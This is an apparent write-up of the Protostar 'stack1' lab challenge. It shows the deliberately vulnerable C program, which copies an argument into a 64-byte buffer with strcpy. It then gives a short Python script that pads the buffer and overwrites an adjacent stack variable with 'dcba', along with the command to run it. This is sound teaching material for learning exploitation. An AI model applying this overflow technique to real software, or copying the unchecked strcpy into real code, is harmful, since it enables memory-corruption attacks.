# Stack1 Solution

## C Code

If you are unfamiliar with the hexadecimal being displayed, `man ascii` is your friend.
Protostar is little endian.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

## Exploit

This challenge uses the **same technique** as [stack0](https://github.com/Naksh-Rathore/protostar-solutions/blob/main/stack0/solution.md), **overwriting a stack variable with a buffer overflow attack**. Only this time, we need to overflow it to be `0x61626364`. 

The vulnerable function now is `strcpy()`. `strcpy()` **copies a string to another string**. The syntax is `strcpy(destination, source)`. After that, it checks if the modified variable is `0x61626364` or `dcba` in little endian, as said before.

To get modified to the `dcba` value, first **we have to fill up the entirety of** `buffer`, then append `dcba` to that string to **overwrite** `modified` to pass the check. Remember, we pass that through an **argument**, not user input.

Exploit:

```python
padding = "A" * 64
modified_val = "\x64\x63\x62\x61" # dcba

print(padding + modified_val)
```
<br />

**To run**: `/opt/protostar/bin/stack1 $(python /tmp/exploit.py)`<br />
**Output**: `you have correctly got the variable to the right value`

## Resources

* [C Code](https://exploit.education/protostar/stack-one/)
* [Wikipedia Article on Endianness](https://en.wikipedia.org/wiki/Endianness)